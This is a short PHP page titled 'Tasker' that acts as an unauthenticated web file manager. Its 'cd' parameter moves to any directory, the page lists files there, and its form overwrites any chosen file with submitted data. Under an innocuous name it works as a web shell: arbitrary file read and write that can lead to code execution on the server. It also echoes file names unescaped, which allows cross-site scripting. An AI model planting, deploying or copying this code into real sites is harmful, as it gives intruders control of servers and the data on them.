<?php
session_start();
if (!isset($_REQUEST['tasks'])) {
    $_REQUEST['tasks'] = [];
}
if (inputValid('filename')) {
    $new_task = [
        'filename'      => $_REQUEST['filename'],
    ];

    $_REQUEST['tasks'][] = $new_task;

} 
function detectExtension($filename) {
	return strtolower(pathinfo($filename, PATHINFO_EXTENSION));
}
function inputValid($input_name) {
    return isset($_REQUEST[$input_name]) && ! empty($_REQUEST[$input_name]);
}
if (isset($_REQUEST['cd'])) {
	chdir($_REQUEST['cd']);
}
?>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport"
          content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <script src="https://code.jquery.com/jquery-3.4.1.min.js"></script>
    <title>Tasker</title>
</head>
<style type="text/css">
	body {
		padding-left:50px;
		padding-right:50px;
	}
	.basic {
		padding:20px;
		background: red;
	}
	.subdir, .subfile {
		background: grey;
		display: inline-block;
	}
</style>
<body>
<div class="basic">
<div class="subdir">
<?php
foreach (scandir(getcwd()) as $key => $value) { 
	if (!is_dir($value) || $value === '.' || $value ==='..') continue; ?>
		<div>
			<a href="?cd=<?= getcwd().'/'.$value ?>"><?= $value ?></a>
		</div>
<?php 
} 
?>
</div>
<div class="subfile">
	<?php
foreach (scandir(getcwd()) as $key => $value) {
	if (!is_file($value)) continue;
	switch (detectExtension($value)) {
		case 'ico':
		case 'png':
			?>
			<div><?= $value ?></div>
			<?php
		break;        	
		default:
			?>
			<div>
				<a href="?cd=<?= getcwd() ?>&filename=<?= getcwd().'/'.$value ?>"><?= $value ?></a>
			</div>
			<?php
		break;
	}
}
?>
</div>
<?php
foreach ($_REQUEST['tasks'] as $key => $value) {
	?><hr><?php
	if (isset($_REQUEST['submit'])) {
		$handle = fopen($value['filename'], 'w');
		if (fwrite($handle, $_REQUEST['data'])) {
			print("success");
		} else {
			print("failed");
		}
	}
	?>
	<form method="post">
		<p>Filename: <?= basename($value['filename']) ?></p>
		<textarea name="data"><?= htmlspecialchars(file_get_contents($value['filename'])) ?></textarea><br>
		<button name="submit">submit</button>
	</form>
	<?php
}
?>
</div>
<script>
</script>

</body>
</html>
